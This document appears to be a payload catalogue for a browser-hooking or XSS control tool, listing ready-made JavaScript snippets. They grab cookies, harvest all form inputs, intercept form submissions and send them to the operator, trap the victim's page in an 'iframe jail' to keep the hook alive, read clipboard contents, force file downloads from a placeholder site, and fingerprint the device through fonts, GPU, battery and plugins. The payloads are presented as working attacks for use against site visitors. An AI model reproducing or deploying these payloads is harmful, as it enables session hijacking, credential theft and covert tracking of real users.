# Default
#### Grab cookies
```javascript
data=document.cookie;
```
#### Get location url
```javascript
data = document.location.href;
```
#### Get os and cpu info
```javascript
data = navigator.platform;
```
#### Vibrate for one second
###### Only for mobile devices
```javascript
navigator.vibrate(1000); data=0;
```
#### Get misc info (better for mobile)
```javascript
data="vendor: "+navigator.vendorSub+","+navigator.vendor+";Product: "+navigator.productSub+";Core: "+navigator.hardwareConcurrency+";maxTouchPoints: "+navigator.maxTouchPoints;
```
#### Send popup message
```javascript
alert('text'); data=0;
```
#### Grab all inputs from all forms:
```javascript
var kvpairs = [];
var iframe = document.getElementById("ifrm");
if (iframe != null)
    var doc = iframe.contentDocument;
else
    var doc = document;
var forms = doc.getElementsByTagName("form");
for (var j = 0;j < forms.length;j++) {
    var form = forms[j];
    for ( var i = 0; i < form.elements.length; i++ ) {
       var e = form.elements[i];
       kvpairs.push(encodeURIComponent(e.name) + "=" + encodeURIComponent(e.value));
    }
}
data = kvpairs.join("&");
```

#### Get information about plugins
```javascript
data = JSON.stringify(navigator.plugins);
```

#### Get browser information
```javascript
data = navigator.appName+" "+navigator.appCodeName+" "+navigator.appVersion;
```
#### Enumerate navigator properties
```javascript
data="";for (var p in navigator) data+=p.toString()+";";
```
#### Get screen information
```javascript
data="width: "+screen.width+",height: "+screen.height+",colorDepth: "+screen.colorDepth+",pixelDepth: "+screen.pixelDepth;
```
#### Get battery information
```javascript
var Battery=function(){function s(e){n=e,i(n)}function o(t){for(var n in e.split(" "))t.addEventListener(n,s)}var e="chargingchange chargingtimechange dischargingtimechange levelchange",t=navigator.battery||navigator.mozBattery||navigator.getBattery,n=null,r=function(){},i=function(){};return self.getStatus=function(e){n==="not supported"?e(null,n):n?e(n):r=e},self.onUpdate=function(e){i=e},t instanceof Function?t.call(navigator).then(function(e){n=e,r(n),o(n)},function(){n="not supported"}):t?(n=t,o(t)):n="not supported",self}(Battery||{});
Battery.getStatus(function(status, error) {
  if(error) {
    console.error('Battery status is not supported');
    return;
  }
  data='Level: ' + Math.floor(status.level * 100) + '%;Charging: ' + status.charging+';Time until charged: ' + status.chargingTime+';Battery time left: ' + status.dischargingTime;
});
```
#### Delete client registration
```javascript
eraseCookie('_uidk'); localStorage.clear(); data=0;
```
#### Iframe jail
```javascript
document.body.innerHTML = "<div style='padding:0;margin:0;border:none;width:100%;height:100%;position:absolute;left:0;top:0;overflow:hidden;'><iframe id='ifrm' onload='window.history.replaceState(null, null, this.contentWindow.location.href);' style='padding:0;margin:0;border:none;width:100%;height:100%;left:0;top:0;' src='"+document.location.href+"'></iframe></div>"; data='captured';
```
#### Force (every kind of) file to be downloaded (html5)
```javascript
var fdwnl = document.createElement("a"); fdwnl.href='http://yoursite.com/yourfile.html'; fdwnl.id='fdwnl'; var dwn=document.createAttribute('download');fdwnl.setAttributeNode(dwn); fdwnl.click();
```
#### Force an update of the client information retrieved server side
```javascript
eraseCookie('_uidku');data=0;
```
#### Intercept forms submit
```javascript
var iframe = document.getElementById("ifrm");
if (iframe != null)
    var doc = iframe.contentDocument;
else
    var doc = document;
var forms = doc.getElementsByTagName("form");
for (var j = 0;j < forms.length;j++) {
    var form = forms[j];
    form.onsubmit = function(){ inthandler(this); }
}
function inthandler(form) {
    var kvpairs = [];
    data = "form submitted! id="+form.id+"&name="+form.name+"&method="+form.method+"&action="+form.action+"&";
    for ( var i = 0; i < form.elements.length; i++ ) {
       var e = form.elements[i];
       kvpairs.push(encodeURIComponent(e.name) + "=" + encodeURIComponent(e.value));
    }
    data = kvpairs.join("&");
    /* Force to send data instantly */
    reloadjs(uid,data);
}
```
# Extra
#### Detect installed font (and the os)
```javascript
var Detector = function() {
		// a font will be compared against all the three default fonts.
		// and if it doesn't match all 3 then that font is not available.
		var baseFonts = ['monospace', 'sans-serif', 'serif'];

		//we use m or w because these two characters take up the maximum width.
		// And we use a LLi so that the same matching fonts can get separated
		var testString = "mmmmmmmmmmlli";

		//we test using 72px font size, we may use any size. I guess larger the better.
		var testSize = '72px';

		var h = document.getElementsByTagName("body")[0];
		// create a SPAN in the document to get the width of the text we use to test
		var s = document.createElement("span");
		s.style.fontSize = testSize;
		s.innerHTML = testString;
		var defaultWidth = {};
		var defaultHeight = {};

		for (var index in baseFonts) {
		    //get the default width for the three base fonts
		    s.style.fontFamily = baseFonts[index];
		    h.appendChild(s);
		    defaultWidth[baseFonts[index]] = s.offsetWidth; //width for the default font
		    defaultHeight[baseFonts[index]] = s.offsetHeight; //height for the defualt font
		    h.removeChild(s);
		}

		function detect(font) {
		    var detected = false;
		    for (var index in baseFonts) {
		        s.style.fontFamily = font + ',' + baseFonts[index]; // name of the font along with the base font for fallback.
		        h.appendChild(s);
		        var matched = (s.offsetWidth != defaultWidth[baseFonts[index]] || s.offsetHeight != defaultHeight[baseFonts[index]]);
		        h.removeChild(s);
		        detected = detected || matched;
		    }
		    return detected;
		}
		this.detect = detect;
	}
var fonts = [];
var d = new Detector();
/* Windows fonts */
fonts.push("Georgia"); fonts.push("Times New Roman"); fonts.push("Tahoma"); fonts.push("Verdana");
/* MAC fonts */
fonts.push("Apple Chancery"); fonts.push("Apple Symbols"); fonts.push("Apple Braille");
/* Linux fonts */
fonts.push("Helvetica"); fonts.push("Utopia"); fonts.push("FreeMono"); fonts.push("FreeSerif");
data="";
for (i = 0; i < fonts.length; i++) {
    if(d.detect(fonts[i])) data += fonts[i]+";";
}
```
#### Get memory information
###### Supported only by some old browser
```javascript
data = "totalJSHeapSize="+console.memory.totalJSHeapSize+";jsHeapSizeLimit="+console.memory.jsHeapSizeLimit+";usedJSHeapSize="+console.memory.usedJSHeapSize;
```
#### Get GPU information
##### Supported only by some (probably old) browser
```javascript
var canvas = document.createElement("canvas");
gl = canvas.getContext("experimental-webgl");
if (gl==null) data="Unable to retrieve this information";
else data = "GPU: "+gl.getParameter(gl.getExtension("WEBGL_debug_renderer_info").UNMASKED_RENDERER_WEBGL)+" "+gl.getParameter(gl.getExtension("WEBGL_debug_renderer_info").UNMASKED_VENDOR_WEBGL);
```
#### Get text in the clipboard
###### Only for IE, ask for permission
```javascript
data=window.clipboardData.getData('Text');
```
#### Know if the page is hidden
###### It's true only when is opened another tab or the browser is minimized
```javascript
function isPageHidden(){
     return document.hidden || document.msHidden || document.webkitHidden || document.mozHidden;
}
data="Page hidden: "+isPageHidden();
```
#### Download file with Javascript
```javascript
/*! @source http://purl.eligrey.com/github/FileSaver.js/blob/master/FileSaver.js */
var saveAs=saveAs||function(e){"use strict";if(typeof navigator!=="undefined"&&/MSIE [1-9]\./.test(navigator.userAgent)){return}var t=e.document,n=function(){return e.URL||e.webkitURL||e},r=t.createElementNS("http://www.w3.org/1999/xhtml","a"),i="download"in r,o=function(e){var t=new MouseEvent("click");e.dispatchEvent(t)},a=/Version\/[\d\.]+.*Safari/.test(navigator.userAgent),f=e.webkitRequestFileSystem,u=e.requestFileSystem||f||e.mozRequestFileSystem,s=function(t){(e.setImmediate||e.setTimeout)(function(){throw t},0)},c="application/octet-stream",d=0,l=500,w=function(t){var r=function(){if(typeof t==="string"){n().revokeObjectURL(t)}else{t.remove()}};if(e.chrome){r()}else{setTimeout(r,l)}},p=function(e,t,n){t=[].concat(t);var r=t.length;while(r--){var i=e["on"+t[r]];if(typeof i==="function"){try{i.call(e,n||e)}catch(o){s(o)}}}},v=function(e){if(/^\s*(?:text\/\S*|application\/xml|\S*\/\S*\+xml)\s*;.*charset\s*=\s*utf-8/i.test(e.type)){return new Blob(["\ufeff",e],{type:e.type})}return e},y=function(t,s,l){if(!l){t=v(t)}var y=this,m=t.type,S=false,h,R,O=function(){p(y,"writestart progress write writeend".split(" "))},g=function(){if(R&&a&&typeof FileReader!=="undefined"){var r=new FileReader;r.onloadend=function(){var e=r.result;R.location.href="data:attachment/file"+e.slice(e.search(/[,;]/));y.readyState=y.DONE;O()};r.readAsDataURL(t);y.readyState=y.INIT;return}if(S||!h){h=n().createObjectURL(t)}if(R){R.location.href=h}else{var i=e.open(h,"_blank");if(i==undefined&&a){e.location.href=h}}y.readyState=y.DONE;O();w(h)},b=function(e){return function(){if(y.readyState!==y.DONE){return e.apply(this,arguments)}}},E={create:true,exclusive:false},N;y.readyState=y.INIT;if(!s){s="download"}if(i){h=n().createObjectURL(t);r.href=h;r.download=s;setTimeout(function(){o(r);O();w(h);y.readyState=y.DONE});return}if(e.chrome&&m&&m!==c){N=t.slice||t.webkitSlice;t=N.call(t,0,t.size,c);S=true}if(f&&s!=="download"){s+=".download"}if(m===c||f){R=e}if(!u){g();return}d+=t.size;u(e.TEMPORARY,d,b(function(e){e.root.getDirectory("saved",E,b(function(e){var n=function(){e.getFile(s,E,b(function(e){e.createWriter(b(function(n){n.onwriteend=function(t){R.location.href=e.toURL();y.readyState=y.DONE;p(y,"writeend",t);w(e)};n.onerror=function(){var e=n.error;if(e.code!==e.ABORT_ERR){g()}};"writestart progress write abort".split(" ").forEach(function(e){n["on"+e]=y["on"+e]});n.write(t);y.abort=function(){n.abort();y.readyState=y.DONE};y.readyState=y.WRITING}),g)}),g)};e.getFile(s,{create:false},b(function(e){e.remove();n()}),b(function(e){if(e.code===e.NOT_FOUND_ERR){n()}else{g()}}))}),g)}),g)},m=y.prototype,S=function(e,t,n){return new y(e,t,n)};if(typeof navigator!=="undefined"&&navigator.msSaveOrOpenBlob){return function(e,t,n){if(!n){e=v(e)}return navigator.msSaveOrOpenBlob(e,t||"download")}}m.abort=function(){var e=this;e.readyState=e.DONE;p(e,"abort")};m.readyState=m.INIT=0;m.WRITING=1;m.DONE=2;m.error=m.onwritestart=m.onprogress=m.onwrite=m.onabort=m.onerror=m.onwriteend=null;return S}(typeof self!=="undefined"&&self||typeof window!=="undefined"&&window||this.content);if(typeof module!=="undefined"&&module.exports){module.exports.saveAs=saveAs}else if(typeof define!=="undefined"&&define!==null&&define.amd!=null){define([],function(){return saveAs})};
var blob = new Blob(["Hello, world!"], {type: "text/plain;charset=utf-8"});
saveAs(blob, "hello world.txt");
```
